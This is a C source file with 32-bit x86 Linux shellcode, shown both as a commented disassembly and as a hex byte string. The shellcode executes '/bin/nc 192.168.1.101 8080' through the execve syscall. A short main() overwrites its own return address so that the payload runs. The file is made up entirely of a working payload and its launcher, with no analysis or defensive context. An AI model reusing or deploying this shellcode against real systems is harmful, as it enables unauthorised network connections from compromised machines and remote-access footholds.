/*
08048060 <_start>:
 8048060:       eb 2a                   jmp    804808c <GotoCall>

08048062 <shellcode>:
 8048062:       5e                      pop    %esi
 8048063:       31 c0                   xor    %eax,%eax
 8048065:       88 46 07                mov    %al,0x7(%esi)
 8048068:       88 46 15                mov    %al,0x15(%esi)
 804806b:       88 46 1a                mov    %al,0x1a(%esi)
 804806e:       89 76 1b                mov    %esi,0x1b(%esi)
 8048071:       8d 5e 08                lea    0x8(%esi),%ebx
 8048074:       89 5e 1f                mov    %ebx,0x1f(%esi)
 8048077:       8d 5e 16                lea    0x16(%esi),%ebx
 804807a:       89 5e 23                mov    %ebx,0x23(%esi)
 804807d:       89 46 27                mov    %eax,0x27(%esi)
 8048080:       b0 0b                   mov    $0xb,%al
 8048082:       89 f3                   mov    %esi,%ebx
 8048084:       8d 4e 1b                lea    0x1b(%esi),%ecx
 8048087:       8d 56 27                lea    0x27(%esi),%edx
 804808a:       cd 80                   int    $0x80

0804808c <GotoCall>:
 804808c:       e8 d1 ff ff ff          call   8048062 <shellcode>
 8048091:       2f                      das
 8048092:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8048095:       2f                      das
 8048096:       6e                      outsb  %ds:(%esi),(%dx)
 8048097:       63 23                   arpl   %sp,(%ebx)
 8048099:       31 39                   xor    %edi,(%ecx)
 804809b:       32 2e                   xor    (%esi),%ch
 804809d:       31 36                   xor    %esi,(%esi)
 804809f:       38 2e                   cmp    %ch,(%esi)
 80480a1:       31 2e                   xor    %ebp,(%esi)
 80480a3:       31 30                   xor    %esi,(%eax)
 80480a5:       31 23                   xor    %esp,(%ebx)
 80480a7:       38 30                   cmp    %dh,(%eax)
 80480a9:       38 30                   cmp    %dh,(%eax)
 80480ab:       23 41 41                and    0x41(%ecx),%eax
 80480ae:       41                      inc    %ecx
 80480af:       41                      inc    %ecx
 80480b0:       42                      inc    %edx
 80480b1:       42                      inc    %edx
 80480b2:       42                      inc    %edx
 80480b3:       42                      inc    %edx
 80480b4:       43                      inc    %ebx
 80480b5:       43                      inc    %ebx
 80480b6:       43                      inc    %ebx
 80480b7:       43                      inc    %ebx
 80480b8:       44                      inc    %esp
 80480b9:       44                      inc    %esp
 80480ba:       44                      inc    %esp
 80480bb:       44                      inc    %esp
*/

// /bin/nc 192.168.1.101 8080
char shellcode[] =
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x15\x88\x46\x1a\x89\x76\x1b\x8d\x5e\x08\x89\x5e\x1f\x8d\x5e\x16\x89\x5e\x23\x89\x46\x27\xb0\x0b\x89\xf3\x8d\x4e\x1b\x8d\x56\x27\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x31\x23\x38\x30\x38\x30\x23";

int main()
{
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}